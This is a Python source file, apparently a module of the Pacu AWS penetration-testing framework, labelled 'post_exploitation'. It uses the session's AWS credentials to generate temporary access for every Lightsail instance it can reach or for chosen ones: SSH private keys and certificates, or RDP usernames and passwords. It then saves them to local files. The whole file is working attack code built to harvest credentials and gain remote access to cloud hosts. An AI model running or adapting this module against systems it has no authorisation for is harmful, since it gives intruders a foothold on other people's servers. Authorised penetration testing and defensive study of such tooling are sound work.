#!/usr/bin/env python3
import argparse
import os

from botocore.exceptions import ClientError

module_info = {
    # Name of the module (should be the same as the filename)
    'name': 'generate_temp_lightsail_access',

    # Name and any other notes about the author
    'author': 'Alexander Morgenstern alexander.morgenstern@rhinosecuritylabs.com',

    # Category of the module. Make sure the name matches an existing category.
    'category': 'post_exploitation',

    # One liner description of the module functionality. This shows up when a user searches for modules.
    'one_liner': 'Creates temporary SSH keys for available instances in AWS Lightsail.',

    # Full description about what the module does and how it works
    'description': 'This module creates temporary SSH keys that can be used to connect to Lightsail instances, and downloads them into the session\'s download directory.',

    # A list of AWS services that the module utilizes during its execution
    'services': ['Lightsail'],

    # For prerequisite modules, try and see if any existing modules return the data that is required for your module before writing that code yourself, that way, session data can stay separated and modular.
    'prerequisite_modules': ['enum_lightsail'],

    # External resources that the module depends on. Valid options are either a GitHub URL (must end in .git) or single file URL.
    'external_dependencies': [],

    # Module arguments to autocomplete when the user hits tab
    'arguments_to_autocomplete': ['--instances', '--regions'],
}

parser = argparse.ArgumentParser(add_help=False, description=module_info['description'])

parser.add_argument('--instances', required=False, help='One or more Lightsail instance names, their regions, and their access protocol in the format instanceid@region@protocol. Windows instances will use the RDP protocol, and others use SSH. Defaults to all instances.')
parser.add_argument('--regions', required=False, default=None, help='One or more (comma separated) AWS regions in the format us-east-1. Defaults to all session regions.')


def write_keys_to_file(created_keys, session):
    for region in created_keys:
        ssh_key_dir = os.path.join(os.getcwd(), 'sessions', session.name, 'downloads', 'generate_temp_lightsail_access', region)
        if not os.path.exists(ssh_key_dir):
            os.makedirs(ssh_key_dir)
        for credential in created_keys[region]:
            if credential['protocol'] == 'rdp':
                windows_file_dir = os.path.join(ssh_key_dir, credential['instanceName'])
                try:
                    with open(windows_file_dir, 'w') as windows_file:
                        # Create header for file.
                        windows_file.write('instanceName,ipAddress,username,password\n')

                        windows_file.write(credential['instanceName'] + ',')
                        windows_file.write(credential['ipAddress'] + ',')
                        windows_file.write(credential['username'] + ',')
                        windows_file.write(credential['password'] + '\n')
                except IOError:
                    print('Error writing credential file for {}.'.format(credential['instanceName']))
                    continue
            else:
                private_key_file_dir = os.path.join(ssh_key_dir, credential['instanceName'])
                cert_key_file_dir = os.path.join(ssh_key_dir, credential['instanceName'] + '-cert.pub')
                try:
                    with open(private_key_file_dir, 'w') as private_key_file:
                        private_key_file.write(credential['privateKey'])
                    with open(cert_key_file_dir, 'w') as cert_key_file:
                        cert_key_file.write(credential['certKey'])
                except IOError:
                    print('Error writing credential file for {}.'.format(credential['instanceName']))
                    continue


def main(args, pacu_main):
    session = pacu_main.get_active_session()
    print = pacu_main.print
    get_regions = pacu_main.get_regions
    fetch_data = pacu_main.fetch_data
    all_regions_prompt = pacu_main.all_regions_prompt

    args = parser.parse_args(args)
    if args.regions:
        regions = args.regions.split(',')
    else:
        regions = get_regions('lightsail')
        if not all_regions_prompt(regions):
            return
    instances = {}
    for region in regions:
        instances[region] = []

    if args.instances is not None:  # need to update this to include the regions of these IDs
        for instance in args.instances.split(','):
            instance_name = instance.split('@')[0]
            region = instance.split('@')[1]
            protocol = instance.split('@')[2]
            if region not in regions:
                print('  {} is not a valid region'.format(region))
                continue
            else:
                instances[region].append({
                    'name': instance_name,
                    'protocol': protocol
                })
    else:
        print('Targeting all Lightsail instances...')
        if fetch_data(['Lightsail'], 'enum_lightsail', '--instances') is False:
            print('Pre-req module not run successfully. Exiting...')
            return
        for region in session.Lightsail:
            if region in regions:
                for instance in session.Lightsail[region]['instances']:
                    protocol = 'rdp' if 'Windows' in instance['blueprintName'] else 'ssh'
                    instances[region].append({
                        'name': instance['name'],
                        'protocol': protocol
                    })

    temp_keys = {}
    for region in instances:
        temp_keys[region] = []
        print('Starting region {}...'.format(region))
        client = pacu_main.get_boto3_client('lightsail', region)
        for instance in instances[region]:
            print('  Processing instance {}'.format(instance['name']))
            try:
                name = instance['name']
                protocol = instance['protocol']
                response = client.get_instance_access_details(
                    instanceName=name,
                    protocol=protocol
                )
                temp_keys[region].append(response['accessDetails'])
                print('  Successfully created temporary access for {}'.format(name))
            except ClientError as error:
                code = error.response['Error']['Code']
                if code == 'AccessDeniedException':
                    print('Unauthorized to generate temporary access.')
                    return
                elif code == 'OperationFailureException':
                    print(error.response['Error']['Message'])
                    continue
                else:
                    print(error)
                break

    write_keys_to_file(temp_keys, session)
    print('{} completed.\n'.format(module_info['name']))

    windows_count = 0
    ssh_count = 0
    for region in temp_keys:
        for credential in temp_keys[region]:
            if credential['protocol'] == 'rdp':
                windows_count += 1
            else:
                ssh_count += 1

    if windows_count or ssh_count:
        written_file_path = os.path.join('sessions', session.name, 'downloads', 'generate_temp_lightsail_access')
    else:
        written_file_path = None

    summary_data = {
        'windows': windows_count,
        'linux': ssh_count,
        'written_file_path': written_file_path,
    }
    return summary_data


def summary(data, pacu_main):
    out = '  Created temporary access for {} Windows instances.\n'.format(data['windows'])
    out += '  Created temporary access for {} Linux instances.\n'.format(data['linux'])
    if data['written_file_path'] is not None:
        out += '\n  Credential files written to directory {}{}.'.format(data['written_file_path'], os.path.sep)
    return out
